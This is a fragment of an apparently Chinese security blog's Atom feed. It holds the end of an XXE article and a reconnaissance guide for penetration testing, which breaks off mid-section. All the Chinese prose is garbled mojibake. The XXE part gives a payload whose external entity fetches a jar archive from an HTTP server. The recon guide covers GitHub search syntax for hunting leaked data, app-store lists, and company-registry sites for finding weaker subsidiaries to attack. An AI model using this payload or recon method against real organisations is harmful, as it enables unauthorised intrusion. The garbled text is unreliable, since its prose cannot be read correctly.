åè®®å¯ä»¥èµ·åˆ°åˆ—ç›®å½•çš„ä½œç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç”¨ file:/// åè®®é…åˆ jar:// åè®®ä½¿ç”¨</p></blockquote><p>å¤§æ¦‚çš„payloadå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¿¡æ¯æ”¶é›†æ€»ç»“</title>
    <link href="https://www.ascotbe.com/2020/07/23/InformationGathering/"/>
    <id>https://www.ascotbe.com/2020/07/23/InformationGathering/</id>
    <published>2020-07-23T13:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>å¯¹æ²¡é”™è¿™æ˜¯è¿™æ˜ŸæœŸçš„ç¬¬ä¸‰ç¯‡æ–‡ç« äº†ï¼Œç›®å‰åªå†™äº†ä¸ªGitHubçš„ä½¿ç”¨æ–¹æ³•ï¼Œç­‰å‘¨å…­å‘¨å¤©è¡¥å……å§</p><h2 id="Githubæœç´¢è¯­æ³•"><a href="#Githubæœç´¢è¯­æ³•" class="headerlink" title="Githubæœç´¢è¯­æ³•"></a>Githubæœç´¢è¯­æ³•</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒGitHubå°±æ˜¯ä¿¡æ¯æ³„éœ²çš„å®åº“ä¹‹ä¸€ï¼Œç”¨å¥½è¯­æ³•å¤©å¤©é«˜å±æ¥æ•²ä½ å®¶é—¨ï¼ˆé€ƒ</p><h3 id="ç›¸å…³è¯­æ³•"><a href="#ç›¸å…³è¯­æ³•" class="headerlink" title="ç›¸å…³è¯­æ³•"></a>ç›¸å…³è¯­æ³•</h3><h4 id="æŸ¥è¯¢å¤§äºæˆ–å°äºå¦ä¸€ä¸ªå€¼çš„å€¼"><a href="#æŸ¥è¯¢å¤§äºæˆ–å°äºå¦ä¸€ä¸ªå€¼çš„å€¼" class="headerlink" title="æŸ¥è¯¢å¤§äºæˆ–å°äºå¦ä¸€ä¸ªå€¼çš„å€¼"></a>æŸ¥è¯¢å¤§äºæˆ–å°äºå¦ä¸€ä¸ªå€¼çš„å€¼</h4><p>æ‚¨å¯ä»¥ä½¿ç”¨<code>&gt;</code>ï¼Œ<code>&gt;=</code>ï¼Œ<code>&lt;</code>ï¼Œå’Œ<code>&lt;=</code>æœç´¢æ˜¯å¤§äºï¼Œå¤§äºæˆ–ç­‰äºï¼Œå°äºå’Œå°äºæˆ–ç­‰äºå¦ä¸€ä¸ªå€¼çš„å€¼ã€‚</p><table><thead><tr><th>æŸ¥è¯¢</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>&gt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3E1000&type=Repositories">cats stars:&gt;1000</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æ˜Ÿæ ‡è¶…è¿‡ 1000 ä¸ªçš„ä»“åº“ã€‚</td></tr><tr><td><code>&gt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+topics:%3E=5&type=Repositories">cats topics:&gt;=5</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æœ‰ 5 ä¸ªæˆ–æ›´å¤šä¸»é¢˜çš„ä»“åº“ã€‚</td></tr><tr><td><code>&lt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+size:%3C10000&type=Code">cats size:&lt;10000</a></strong> åŒ¹é…å°äº 10 KB çš„æ–‡ä»¶ä¸­å«æœ‰ â€œcatsâ€ å­—æ ·çš„ä»£ç ã€‚</td></tr><tr><td><code>&lt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3C=50&type=Repositories">cats stars:&lt;=50</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æ˜Ÿæ ‡ä¸è¶…è¿‡ 50 ä¸ªçš„ä»“åº“ã€‚</td></tr><tr><td><code>n..*</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..*&type=Repositories">cats stars:10..*</a></strong> ç­‰åŒäº <code>stars:&gt;=10</code> å¹¶åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æœ‰ 10 ä¸ªæˆ–æ›´å¤šæ˜Ÿå·çš„ä»“åº“ã€‚</td></tr><tr><td><code>*..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%22*..10%22&type=Repositories">cats stars:*..10</a></strong> ç­‰åŒäº <code>stars:&lt;=10</code> å¹¶åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æœ‰ä¸è¶…è¿‡ 10 ä¸ªæ˜Ÿå·çš„ä»“åº“ã€‚</td></tr></tbody></table><h4 id="æŸ¥è¯¢èŒƒå›´ä¹‹é—´çš„å€¼"><a href="#æŸ¥è¯¢èŒƒå›´ä¹‹é—´çš„å€¼" class="headerlink" title="æŸ¥è¯¢èŒƒå›´ä¹‹é—´çš„å€¼"></a>æŸ¥è¯¢èŒƒå›´ä¹‹é—´çš„å€¼</h4><p>æ‚¨å¯ä»¥ä½¿ç”¨èŒƒå›´è¯­æ³• <code>n..n</code> æœç´¢èŒƒå›´å†…çš„å€¼ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæ•°å­— <em>n</em> æ˜¯æœ€ä½å€¼ï¼Œè€Œç¬¬äºŒä¸ªæ˜¯æœ€é«˜å€¼ã€‚</p><table><thead><tr><th>æŸ¥è¯¢</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>n..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..50&type=Repositories">cats stars:10..50</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æœ‰ 10 åˆ° 50 ä¸ªæ˜Ÿå·çš„ä»“åº“ã€‚</td></tr></tbody></table><h4 id="æŸ¥è¯¢æ—¥æœŸ"><a href="#æŸ¥è¯¢æ—¥æœŸ" class="headerlink" title="æŸ¥è¯¢æ—¥æœŸ"></a>æŸ¥è¯¢æ—¥æœŸ</h4><p>æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>&gt;</code>ã€<code>&gt;=</code>ã€<code>&lt;</code>ã€<code>&lt;=</code> å’ŒèŒƒå›´æŸ¥è¯¢æœç´¢æ—©äºæˆ–æ™šäºå¦ä¸€ä¸ªæ—¥æœŸï¼Œæˆ–è€…ä½äºæ—¥æœŸèŒƒå›´å†…çš„æ—¥æœŸã€‚ æ—¥æœŸæ ¼å¼å¿…é¡»éµå¾ª <a href="http://en.wikipedia.org/wiki/ISO_8601">ISO8601</a>æ ‡å‡†ï¼Œå³ <code>YYYY-MM-DD</code>ï¼ˆå¹´-æœˆ-æ—¥ï¼‰ã€‚</p><table><thead><tr><th>æŸ¥è¯¢</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>&gt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E2016-04-29&type=Issues">cats created:&gt;2016-04-29</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€åœ¨ 2016 å¹´ 4 æœˆ 29 æ—¥ä¹‹ååˆ›å»ºçš„è®®é¢˜ã€‚</td></tr><tr><td><code>&gt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E=2017-04-01&type=Issues">cats created:&gt;=2017-04-01</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€åœ¨ 2017 å¹´ 4 æœˆ 1 æ—¥æˆ–ä¹‹ååˆ›å»ºçš„è®®é¢˜ã€‚</td></tr><tr><td><code>&lt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?q=cats+pushed:%3C2012-07-05&type=Code&utf8=%E2%9C%93">cats pushed:&lt;2012-07-05</a></strong> åŒ¹é…åœ¨ 2012 å¹´ 7 æœˆ 5 æ—¥ä¹‹å‰æ¨é€çš„ä»“åº“ä¸­å«æœ‰ â€œcatsâ€ å­—æ ·çš„ä»£ç ã€‚</td></tr><tr><td><code>&lt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3C=2012-07-04&type=Issues">cats created:&lt;=2012-07-04</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€åœ¨ 2012 å¹´ 7 æœˆ 4 æ—¥æˆ–ä¹‹å‰åˆ›å»ºçš„è®®é¢˜ã€‚</td></tr><tr><td><code>YYYY-MM-DD..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+pushed:2016-04-30..2016-07-04&type=Repositories">cats pushed:2016-04-30..2016-07-04</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€åœ¨ 2016 å¹´ 4 æœˆæœ«åˆ° 7 æœˆä¹‹é—´æ¨é€çš„ä»“åº“ã€‚</td></tr><tr><td><code>YYYY-MM-DD..</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2012-04-30..*&type=Issues">cats created:2012-04-30..*</a></strong> åŒ¹é…åœ¨ 2012 å¹´ 4 æœˆ 30 æ—¥ä¹‹ååˆ›å»ºã€å«æœ‰ â€œcatsâ€ å­—æ ·çš„è®®é¢˜ã€‚</td></tr><tr><td><code>..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:*..2012-07-04&type=Issues">cats created:*..2012-04-30</a></strong> åŒ¹é…åœ¨ 2012 å¹´ 7 æœˆ 4 æ—¥ä¹‹å‰åˆ›å»ºã€å«æœ‰ â€œcatsâ€ å­—æ ·çš„è®®é¢˜ã€‚</td></tr></tbody></table><p>æ‚¨ä¹Ÿå¯ä»¥åœ¨æ—¥æœŸåæ·»åŠ å¯é€‰çš„æ—¶é—´ä¿¡æ¯ <code>THH:MM:SS+00:00</code>ï¼Œä»¥ä¾¿æŒ‰å°æ—¶ã€åˆ†é’Ÿå’Œç§’è¿›è¡Œæœç´¢ã€‚ è¿™æ˜¯ <code>T</code>ï¼Œéšåæ˜¯ <code>HH:MM:SS</code>ï¼ˆæ—¶-åˆ†-ç§’ï¼‰å’Œ UTC åç§» (<code>+00:00</code>)ã€‚</p><table><thead><tr><th>æŸ¥è¯¢</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>YYYY-MM-DDTHH:MM:SS+00:00</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00&type=Issues">cats created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00</a></strong> åŒ¹é…åœ¨ 2017 å¹´ 1 æœˆ 1 æ—¥å‡Œæ™¨ 1 ç‚¹ï¼ˆUTC åç§»ä¸º <code>07:00</code>ï¼‰ä¸ 2017 å¹´ 3 æœˆ 1 æ—¥ä¸‹åˆ 3 ç‚¹ï¼ˆUTC åç§»ä¸º <code>07:00</code>ï¼‰ä¹‹é—´åˆ›å»ºçš„è®®é¢˜ã€‚</td></tr><tr><td><code>YYYY-MM-DDTHH:MM:SSZ</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z&type=Issues">cats created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z</a></strong> åŒ¹é…åœ¨ 2016 å¹´ 3 æœˆ 21 æ—¥ä¸‹åˆ 2:11 ä¸ 2016 å¹´ 4 æœˆ 7 æ—¥æ™šä¸Š 8:45 ä¹‹é—´åˆ›å»ºçš„è®®é¢˜ã€‚</td></tr></tbody></table><h4 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h4><p>æ‚¨å¯ä»¥ä½¿ç”¨ <code>NOT</code> è¯­æ³•æ’é™¤åŒ…å«ç‰¹å®šå­—è¯çš„ç»“æœã€‚ <code>NOT</code> è¿ç®—ç¬¦åªèƒ½ç”¨äºå­—ç¬¦ä¸²å…³é”®è¯ï¼Œ ä¸é€‚ç”¨äºæ•°å­—æˆ–æ—¥æœŸã€‚</p><table><thead><tr><th align="left">æŸ¥è¯¢</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><code>NOT</code></td><td align="left"><strong><a href="https://github.com/search?q=hello+NOT+world&type=Repositories">hello NOT world</a></strong> åŒ¹é…å«æœ‰ â€œhelloâ€ å­—æ ·ä½†ä¸å«æœ‰ â€œworldâ€ å­—æ ·çš„ä»“åº“ã€‚</td></tr></tbody></table><p>è¿˜å¯ä»¥ä½¿ç”¨åŒ…æ‹¬<code>AND</code>ã€<code>OR</code>è¿ç®—ç¬¦</p><h4 id="æ’é™¤è¿ç®—ç¬¦"><a href="#æ’é™¤è¿ç®—ç¬¦" class="headerlink" title="æ’é™¤è¿ç®—ç¬¦"></a>æ’é™¤è¿ç®—ç¬¦</h4><p>ç¼©å°æœç´¢ç»“æœèŒƒå›´çš„å¦ä¸€ç§é€”å¾„æ˜¯æ’é™¤ç‰¹å®šçš„å­é›†ã€‚ æ‚¨å¯ä»¥ä¸ºä»»ä½•æœç´¢é™å®šç¬¦æ·»åŠ  <code>-</code> å‰ç¼€ï¼Œä»¥æ’é™¤è¯¥é™å®šç¬¦åŒ¹é…çš„æ‰€æœ‰ç»“æœã€‚</p><table><thead><tr><th align="left">æŸ¥è¯¢</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><code>-*QUALIFIER</code></td><td align="left"><strong><a href="https://github.com/search?q=cats+stars:%3E10+-language:javascript&type=Repositories">cats stars:&gt;10 -language:javascript</a></strong> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ã€æœ‰è¶…è¿‡ 10 ä¸ªæ˜Ÿå·ä½†å¹¶éä»¥ JavaScript ç¼–å†™çš„ä»“åº“ã€‚</td></tr><tr><td align="left"></td><td align="left"><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=mentions:defunkt+-org:github&type=Issues">mentions:defunkt -org:github</a></strong> åŒ¹é…æåŠ @defunkt ä¸”ä¸åœ¨ GitHub ç»„ç»‡ä»“åº“ä¸­çš„è®®é¢˜</td></tr></tbody></table><h4 id="æœ‰ç©ºæ ¼çš„æŸ¥è¯¢éœ€ä½¿ç”¨å¼•å·"><a href="#æœ‰ç©ºæ ¼çš„æŸ¥è¯¢éœ€ä½¿ç”¨å¼•å·" class="headerlink" title="æœ‰ç©ºæ ¼çš„æŸ¥è¯¢éœ€ä½¿ç”¨å¼•å·"></a>æœ‰ç©ºæ ¼çš„æŸ¥è¯¢éœ€ä½¿ç”¨å¼•å·</h4><p>å¦‚æœæœç´¢å«æœ‰ç©ºæ ¼çš„æŸ¥è¯¢ï¼Œæ‚¨éœ€è¦ç”¨å¼•å·å°†å…¶æ‹¬èµ·æ¥ã€‚ ä¾‹å¦‚ï¼š</p><ul><li><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+NOT+%22hello+world%22&type=Repositories">cats NOT â€œhello worldâ€</a> åŒ¹é…å«æœ‰ â€œcatsâ€ å­—æ ·ä½†ä¸å«æœ‰ â€œhello worldâ€ å­—æ ·çš„ä»“åº“ã€‚</li></ul><h4 id="åŒ…å«è¿ç®—ç¬¦"><a href="#åŒ…å«è¿ç®—ç¬¦" class="headerlink" title="åŒ…å«è¿ç®—ç¬¦"></a>åŒ…å«è¿ç®—ç¬¦</h4><table><thead><tr><th align="left">æŸ¥è¯¢</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><code> in:file</code></td><td align="left"><code>cats in:file</code> æœç´¢æ–‡ä»¶ä¸­åŒ…å«catsçš„ä»£ç </td></tr><tr><td align="left"><code>in:path</code></td><td align="left"><code>cats in:path</code> æœç´¢è·¯å¾„ä¸­åŒ…å«catsçš„ä»£ç ã€‚<code>cats in:path,file</code> æœç´¢è·¯å¾„ã€æ–‡ä»¶ä¸­åŒ…å«catsçš„ä»£ç </td></tr></tbody></table><h4 id="å…³é”®å­—æ€»ç»“"><a href="#å…³é”®å­—æ€»ç»“" class="headerlink" title="å…³é”®å­—æ€»ç»“"></a>å…³é”®å­—æ€»ç»“</h4><p><strong>pushed</strong>ï¼šåœ¨pushä¸­çš„ä»£ç ä¸­æŸ¥æ‰¾</p><p><strong>created</strong>ï¼šåŸºäºåˆ›å»ºæ—¶é—´æŸ¥æ‰¾</p><p><strong>stars</strong>ï¼šåŸºäºstaræ•°é‡æŸ¥æ‰¾</p><p><strong>topics</strong>ï¼šåŸºäºæ ‡ç­¾æ•°æŸ¥æ‰¾</p><p><strong>size</strong>ï¼šåŸºäºä»“åº“æ–‡ä»¶æ•°å¤§å°æŸ¥æ‰¾</p><p><strong>language</strong>ï¼šåŸºäºè¯­è¨€æŸ¥æ‰¾</p><p><strong>user</strong>ï¼šåŸºäºç”¨æˆ·åæŸ¥æ‰¾</p><p><strong>org</strong>ï¼šåŸºäºç»„ç»‡æœç´¢</p><p><strong>in</strong>ï¼šåŒ…å«æœç´¢</p><p><strong>repo</strong>ï¼šæŒ‡å®šä»“åº“æœç´¢  <code>repo:USERNAME/REPOSITORY</code></p><p><strong>filename</strong>ï¼šåŸºäºæ–‡ä»¶åæŸ¥æ‰¾</p><p><strong>path</strong>ï¼šæŒ‡å®šè·¯å¾„æœç´¢ <code>cats path:app/public language:javascript </code> æœç´¢å…³é”®å­—catsï¼Œä¸”è¯­è¨€ä¸ºjavascriptï¼Œåœ¨app/publicä¸‹çš„ä»£ç </p><p><strong>extension</strong>ï¼šæŒ‡å®šæ‰©å±•åæœç´¢ <code>extension:properties jdbc</code></p><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>åªèƒ½æœç´¢å°äº384 KBçš„æ–‡ä»¶ã€‚</li><li>ä¸æ”¯æŒé•¿åº¦è¶…è¿‡ 256 ä¸ªå­—ç¬¦çš„æŸ¥è¯¢</li><li>æ‚¨æ— æ³•ä½¿ç”¨è¶…è¿‡äº”ä¸ª <code>AND</code>ã€<code>OR</code> æˆ– <code>NOT</code> è¿ç®—ç¬¦æ„é€ æŸ¥è¯¢</li><li>åªèƒ½æœç´¢å°‘äº500,000ä¸ªæ–‡ä»¶çš„å­˜å‚¨åº“ã€‚</li><li>ç™»å½•çš„ç”¨æˆ·å¯ä»¥æœç´¢æ‰€æœ‰å…¬å…±å­˜å‚¨åº“ã€‚</li><li>é™¤<code>filename</code>æœç´¢å¤–ï¼Œæœç´¢æºä»£ç æ—¶å¿…é¡»è‡³å°‘åŒ…å«ä¸€ä¸ªæœç´¢è¯ã€‚ä¾‹å¦‚ï¼Œæœç´¢<code>language:javascript</code>æ— æ•ˆï¼Œè€Œæ˜¯è¿™æ ·ï¼š<code>amazing language:javascript</code>ã€‚</li><li>æœç´¢ç»“æœæœ€å¤šå¯ä»¥æ˜¾ç¤ºæ¥è‡ªåŒä¸€æ–‡ä»¶çš„ä¸¤ä¸ªç‰‡æ®µï¼Œä½†æ–‡ä»¶ä¸­å¯èƒ½ä¼šæœ‰æ›´å¤šç»“æœã€‚</li><li>æ‚¨ä¸èƒ½å°†ä»¥ä¸‹é€šé…ç¬¦ç”¨ä½œæœç´¢æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ï¼š<code>. , : ; / \ &#39; &quot; = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) &#123; &#125; [ ]</code>ã€‚æœç´¢å°†å¿½ç•¥è¿™äº›ç¬¦å·ã€‚</li></ul><h2 id="æœç´¢å¼•æ“æœç´¢"><a href="#æœç´¢å¼•æ“æœç´¢" class="headerlink" title="æœç´¢å¼•æ“æœç´¢"></a>æœç´¢å¼•æ“æœç´¢</h2><p>è¿™ä¸ªå°±é‚£å‡ ä¸ªè¯­æ³•ï¼Œå¤§å®¶åº”è¯¥éƒ½ä¼šã€‚</p><h2 id="APPæ”¶é›†"><a href="#APPæ”¶é›†" class="headerlink" title="APPæ”¶é›†"></a>APPæ”¶é›†</h2><h3 id="å®‰å“"><a href="#å®‰å“" class="headerlink" title="å®‰å“"></a>å®‰å“</h3><p>å¯ä»¥é€šè¿‡å„å¤§APPå•†åº—æ¥æœç´¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GooglePlayå•†åº—:https:&#x2F;&#x2F;developer.android.google.cn</span><br><span class="line">å°ç±³åº”ç”¨å•†åº—:http:&#x2F;&#x2F;app.mi.com&#x2F;</span><br><span class="line">è±Œè±†èš:https:&#x2F;&#x2F;www.wandoujia.com&#x2F;</span><br><span class="line">è±†ç“£:https:&#x2F;&#x2F;www.douban.com&#x2F;app&#x2F;search</span><br><span class="line">åä¸ºåº”ç”¨å¸‚åœº:https:&#x2F;&#x2F;appgallery1.huawei.com</span><br><span class="line">360æ‰‹æœºåŠ©æ‰‹:http:&#x2F;&#x2F;zhushou.360.cn&#x2F;</span><br><span class="line">è…¾è®¯åº”ç”¨å®:http:&#x2F;&#x2F;android.myapp.com&#x2F;</span><br><span class="line">ç™¾åº¦æ‰‹æœºåŠ©æ‰‹:https:&#x2F;&#x2F;sj.qq.com&#x2F;</span><br><span class="line">OPPOè½¯ä»¶å•†åº—:https:&#x2F;&#x2F;store.oppomobile.com&#x2F;</span><br><span class="line">VIVOåº”ç”¨å•†åº—:https:&#x2F;&#x2F;dev.vivo.com.cn&#x2F;distribute&#x2F;appStore</span><br><span class="line">æœç‹—æ‰‹æœºåŠ©æ‰‹:http:&#x2F;&#x2F;zhushou.sogou.com&#x2F;</span><br><span class="line">PPåŠ©æ‰‹:https:&#x2F;&#x2F;www.25pp.com&#x2F;android&#x2F;</span><br><span class="line">é­…æ—åº”ç”¨ä¸­å¿ƒ: http:&#x2F;&#x2F;app.meizu.com&#x2F;</span><br><span class="line">ä¹å•†åº—:https:&#x2F;&#x2F;www.lenovomm.com&#x2F;</span><br><span class="line">å®‰å“å¸‚åœº:http:&#x2F;&#x2F;apk.hiapk.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><p>ç›´æ¥åœ¨AppStoreä¸Šæœç´¢ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§å¯ä»¥ç”¨åœ¨æœç´¢ä¸Šï¼Œå¦‚æœå®‰å“å•†åº—ä¹Ÿæœ‰çš„è¯ä¹Ÿèƒ½é€‚ç”¨ï¼Œè¿™è¾¹å°±æ‹¿é…·ç‹—æ¥è¯•éªŒ</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/1.png" alt="image-20200724172826427" style="zoom: 25%;" /><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç‚¹è¿›å»è¿™ä¸ªAPPåè¿™æ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯ä½ ä»¬å‘ç°è¿™è¾¹æœ‰ä¸€ä¸ªå¼€å‘è€…ä½ç½®äº†å—</p><p>ç‚¹å‡»è¿™ä¸ªå¼€å‘è€…æŒ‰é’®</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/2.png" alt="image-20200724172949944" style="zoom:25%;" /><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ——ä¸‹çš„APPå…¨åœ¨è¿™è¾¹äº†æ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œæœ‰äº›è¿˜ä¼šæœ‰å­å…¬å¸çš„APPåœ¨é‡Œé¢ï¼Œæ¯”å¦‚å­å…¬å¸<strong>å¹¿å·ç¹æ˜Ÿäº’å¨±ä¿¡æ¯ç§‘æŠ€æœ‰é™å…¬å¸</strong>ï¼Œç„¶åä¾æ—§ç‚¹è¿›å»å¼€å‘è€…é‡Œé¢</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/3.png" alt="image-20200724173222756" style="zoom:25%;" /><p>æ˜¯ä¸æ˜¯å‘ç°åˆå¤šäº†å¥½å¤šAPP</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/4.png" alt="image-20200724173330399" style="zoom:25%;" /><h2 id="å…¬ä¼—å·-amp-å°ç¨‹åºæ”¶é›†"><a href="#å…¬ä¼—å·-amp-å°ç¨‹åºæ”¶é›†" class="headerlink" title="å…¬ä¼—å·&amp;å°ç¨‹åºæ”¶é›†"></a>å…¬ä¼—å·&amp;å°ç¨‹åºæ”¶é›†</h2><p>è¿™ä¸ªæ–¹æ³•å°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†</p><p>å¾®ä¿¡ï¼šé€šè¿‡æœç´¢æ¥æŸ¥å°ç¨‹åºå’Œå…¬ä¼—å·</p><p>æ”¯ä»˜å®ï¼šå¯ä»¥é€šè¿‡æ”¯ä»˜å®æ¥æä¸€æ³¢çœ‹ä¸‹æœ‰æ²¡æœ‰å°ç¨‹åº</p><h2 id="å…¬å¸ä¿¡æ¯æ”¶é›†"><a href="#å…¬å¸ä¿¡æ¯æ”¶é›†" class="headerlink" title="å…¬å¸ä¿¡æ¯æ”¶é›†"></a>å…¬å¸ä¿¡æ¯æ”¶é›†</h2><p>æœ‰äº›äººä¼šé—®ä¸ºå•¥è¦æŸ¥è¯¢è¿™äº›ä¿¡æ¯å•Šï¼Œå…¬å¸ä¿¡æ¯å’Œæ¸—é€æœ‰æ¯›å…³ç³»ï¼Œå› ä¸ºæœ‰äº›å­å…¬å¸ä¹Ÿä¼šç”¨æ¯å…¬å¸çš„APIä»¥åŠæ•°æ®åº“ä¹‹ç±»çš„ï¼Œä½†æ˜¯å­å…¬å¸çš„å®‰å…¨æ„è¯†ä¸ä¸€å®šå¼ºï¼Œæˆ‘ä»¬æ¸—é€ä¸èƒ½å¤´é“è¦æ‰¾è½¯æŸ¿å­æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¼æŸ¥æŸ¥ï¼šhttps:&#x2F;&#x2F;www.qcc.com&#x2F;</span><br><span class="line">å¤©çœ¼æŸ¥ï¼šhttps:&#x2F;&#x2F;www.tianyancha.com&#x2F;</span><br><span class="line">å¯ä¿¡å®ï¼šhttps:&#x2F;&#x2F;www.qixin.com&#x2F;</span><br><span class="line">ä¼æŸ¥çŒ«ï¼šhttps:&#x2F;&#x2F;www.qichamao.com&#x2F;</span><br><span class="line">ç¥çœ¼æŸ¥ï¼šhttps:&#x2F;&#x2F;www.shenyancha.com&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™è¾¹å°±åˆ—ä¸¾è¿™å‡ ä¸ªï¼Œæ­£å¸¸æŸ¥è¯¢å·®ä¸å¤šä¸ä¼šæœ‰æ¼ä¸‹çš„äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŠŠå­å…¬å¸çš„åŸŸåå•¥çš„æœé›†èµ·æ¥ç”¨å·¥å…·è·‘å­åŸŸåäº†</p><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><p>ä¸€äº›å¥½çš„å­åŸŸåæ”¶é›†é¡¹ç›®ï¼Œè¿™å‡ 